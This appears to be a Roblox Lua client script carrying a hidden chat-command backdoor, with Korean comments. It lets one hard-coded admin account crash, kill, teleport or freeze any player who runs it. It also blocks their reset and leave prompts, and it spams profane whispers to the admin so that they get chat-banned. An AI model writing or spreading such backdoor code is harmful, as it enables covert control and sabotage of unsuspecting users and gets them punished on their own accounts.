local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local AdminList = { "Diwno2ff" }

local cmds = {}

-- crash
cmds["crash"] = function()
    while true do
        print("Penis")
    end
end

-- kick (재설정 금지 + 나가기 금지)
cmds["kick"] = function(_, _)
    if LocalPlayer.Character then
        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local Hocf = hrp and hrp.CFrame
        if hrp and Hocf then
            hrp.CFrame = CFrame.new(1e7, 1e7, 1e7)
            task.wait(0.1)
            hrp.Anchored = true
            task.wait(0.03)
            hrp.CFrame = Hocf
        end

        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.Health = math.huge
        end
        LocalPlayer.CharacterAdded:Connect(function(char)
            local newHum = char:WaitForChild("Humanoid")
            newHum.Health = math.huge
        end)

        -- 재설정 금지
        task.spawn(function()
            repeat
                task.wait()
                pcall(function()
                    game.StarterGui:SetCore("ResetButtonCallback", false)
                end)
            until false
        end)

        -- 나가기 금지
        task.spawn(function()
            while true do
                pcall(function()
                    game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(obj)
                        if obj.Name == "ErrorPrompt" then
                            obj:Destroy()
                        end
                    end)
                end)
                task.wait(1)
            end
        end)
    end
end

-- bring (Admin → 나, 한 번만)
cmds["bring"] = function(Admin)
    if LocalPlayer.Character and Admin.Character then
        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
        if hrp and adminHrp then
            hrp.CFrame = adminHrp.CFrame
        end
    end
end

-- kill
cmds["kill"] = function()
    if LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
        if hum then
            hum.Health = 0
        end
    end
end

-- chatban (밴 걸릴 때까지 admin에게 비공 메시지 전송)
cmds["chatban"] = function(sender)
    task.spawn(function()
        while true do
            task.wait(0.2)
            local succ, err = pcall(function()
                for _, adminName in ipairs(AdminList) do
                    local admin = Players:FindFirstChild(adminName)
                    if admin then
                        local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
                        if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
                            chatEvent.SayMessageRequest:FireServer("fuck", "To " .. admin.Name)
                        end
                    end
                end
            end)
            if not succ then
                break -- 밴 등으로 채팅 불가 시 종료
            end
        end
    end)
end

-- help (admin 제외한 사용자만 가능)
cmds["help"] = function(sender)
    if not isAdminListed(sender.Name) then
        for _, adminName in ipairs(AdminList) do
            local admin = Players:FindFirstChild(adminName)
            if admin then
                pcall(function()
                    local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
                    if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
                        chatEvent.SayMessageRequest:FireServer("나는 NP를 사용해요.", "To " .. admin.Name)
                    end
                end)
            end
        end
    end
end

-- Admin 확인
function isAdminListed(playerName)
    for _, name in ipairs(AdminList) do
        if name:lower() == playerName:lower() then
            return true
        end
    end
    return false
end

-- 플레이어 찾기
function FindMatch(Name)
    Name = Name:lower()
    for _, Player in Players:GetPlayers() do
        if Player.Name:lower():sub(1, #Name) == Name then
            return Player
        end
    end
    return nil
end

-- 명령 처리
TextChatService.OnIncomingMessage = function(message)
    local sender = message.TextSource
    if not sender then return end

    local senderName = sender.Name
    if not isAdminListed(senderName) then return end

    local lowerMsg = message.Text:lower()
    if string.sub(lowerMsg, 1, 1) == ":" then
        local args = string.split(string.sub(lowerMsg, 2), " ")
        if #args == 0 then return end

        local Command = table.remove(args, 1)
        local TargetName = args[1] or ""
        local Data = table.concat(args, " ", 2)

        Command = Command:lower()
        if cmds[Command] then
            local Target
            if TargetName == "@s" or TargetName:lower() == LocalPlayer.Name:lower() then
                Target = LocalPlayer
            else
                Target = FindMatch(TargetName)
            end

            if TargetName == "all" or Target == LocalPlayer then
                pcall(function()
                    cmds[Command](sender, Data)
                end)
            end
        end
    end
end
